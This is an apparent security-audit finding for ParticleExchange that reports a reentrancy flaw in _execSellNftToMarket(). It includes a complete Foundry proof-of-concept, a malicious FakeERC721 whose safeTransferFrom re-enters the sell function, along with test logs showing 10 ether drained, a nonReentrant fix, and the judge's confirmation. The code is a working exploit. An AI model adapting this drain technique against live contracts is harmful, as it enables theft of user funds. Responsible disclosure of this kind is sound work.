[H-04]_execSellNftToMarket()re-enter steal funds
Submitted bybin2chen
Proof of Concept
_execSellNftToMarket()The number of changes in the balance to represent whether the corresponding amount has been received.
function_execSellNftToMarket(addresscollection,uint256tokenId,uint256amount,boolpushBased,addressmarketplace,bytescalldatatradeData)internal{...if(IERC721(collection).ownerOf(tokenId) ==address(this) ||address(this).balance-ethBefore-wethBefore!=amount) {revertErrors.InvalidNFTSell();}
Since the current contract doesn’t have anynonReentrantrestrictions, the user can usereentrantand pay only once when multiple_execSellNftToMarket()s share the same transfer of funds.
Here are some examples:
Alice supplies a fake NFT_A.Alice executessellNftToMarket(), assumingsellAmount=10.execSellNftToMarket()inside theIERC721(collection).safeTransferFrom()for re-entry.Note: The collection is an arbitrary contract, sosafeTransferFrom()can be any code.Reenter the execution of another Lien’ssellNftToMarket(), and really transfer toamount=10.After the above re-entry, go back to step 3. This step does not need to actually pay, because step 4 has been transferred tosellAmount = 10, so it can pass this verificationaddress(this).balance - ethBefore - wethBefore ! = amountso that only one payment is made, reaching thesellNftToMarket()twice.
Test code:
add to ParticleExchange.t.sol
functiontestReenter()public{vm.deal(address(particleExchange),100ether);FakeERC721fakeERC721=newFakeERC721(particleExchange,address(dummyMarketplace),"fake","fake");vm.deal(address(fakeERC721),10ether);fakeERC721.execSteal();}contractFakeERC721isERC721{ParticleExchangeprivateparticleExchange;addressprivatemarketplace;uintsellAmount=10ether;constructor(ParticleExchange_particleExchange,address_marketplace,stringmemoryname,stringmemorysymbol)ERC721(name,symbol) {particleExchange=_particleExchange;marketplace=_marketplace;}functionmint(addressto,uint256tokenId)external{_safeMint(to,tokenId);}functionexecSteal()external{//0. mint nft and supply lienuint256tokenId=1;_mint(address(this),tokenId);_mint(address(this),tokenId+1);_setApprovalForAll(address(this),address(particleExchange),true);//console.log(isApprovedForAll(address(this),address(particleExchange)));uint256lienId=particleExchange.supplyNft(address(this),tokenId,sellAmount,0);uint256lienId2=particleExchange.supplyNft(address(this),tokenId+1,sellAmount,0);uint256particleExchangeBefore=address(particleExchange).balance;uint256fakeNftBefore=address(this).balance;console.log("before particleExchange balance:",particleExchangeBefore/1ether);console.log("before fakeNft balance:",fakeNftBefore/1ether);//1.sell , reenter pay one but sell two liensell(lienId,tokenId,sellAmount);//2. repay lien 1 get 10 ether fundsparticleExchange.repayWithNft(Lien({lender:address(this),borrower:address(this),collection:address(this),tokenId:tokenId,price:sellAmount,rate:0,loanStartTime:block.timestamp,credit:0,auctionStartTime:0}),lienId,tokenId);//3. repay lien 2 get 10 ether fundsparticleExchange.repayWithNft(Lien({lender:address(this),borrower:address(this),collection:address(this),tokenId:tokenId+1,price:sellAmount,rate:0,loanStartTime:block.timestamp,credit:0,auctionStartTime:0}),lienId2,tokenId+1);//4.show fakeNft steal fundsconsole.log("after particleExchange balance:",address(particleExchange).balance/1ether);console.log("after fakeNft balance:",address(this).balance/1ether);console.log("after particleExchange lost:",(particleExchangeBefore-address(particleExchange).balance)/1ether);console.log("after fakeNft steal:",(address(this).balance-fakeNftBefore) /1ether);}functionsell(uint256lienId,uint256tokenId,uint256sellAmount)private{bytesmemorytradeData=abi.encodeWithSignature("sellToMarket(address,address,uint256,uint256)",address(particleExchange),address(this),tokenId,sellAmount);particleExchange.sellNftToMarket(Lien({lender:address(this),borrower:address(0),collection:address(this),tokenId:tokenId,price:sellAmount,rate:0,loanStartTime:0,credit:0,auctionStartTime:0}),lienId,sellAmount,true,marketplace,tradeData);}functionsafeTransferFrom(addressfrom,addressto,uint256tokenId,bytesmemorydata)publicvirtualoverride{if(from==address(particleExchange)){if(tokenId==1) {//tokenId =1 , reenter , don't paysell(1,tokenId+1,sellAmount);}else{// tokenId = 2 ,real paypayable(address(particleExchange)).transfer(sellAmount);}}_transfer(_ownerOf(tokenId),to,tokenId);//anyone can transfer}fallback()externalpayable{}}
$ forge test --match testReenter  -vvvRunning 1 test for test/ParticleExchange.t.sol:ParticleExchangeTest[PASS] testReenter() (gas: 1869563)Logs:before particleExchange balance: 100before fakeNft balance: 10after particleExchange balance: 90after fakeNft balance: 20after particleExchange lost: 10after fakeNft steal: 10
Test result: ok. 1 passed; 0 failed; finished in 4.80ms
Recommended Mitigation Steps
AddnonReentrantrestrictions to all Lien-related methods.
Assessed type
Reentrancy
hansfriese (judge) commented:
Good finding!
wukong-particle (Particle) confirmed and commented:
Fixed.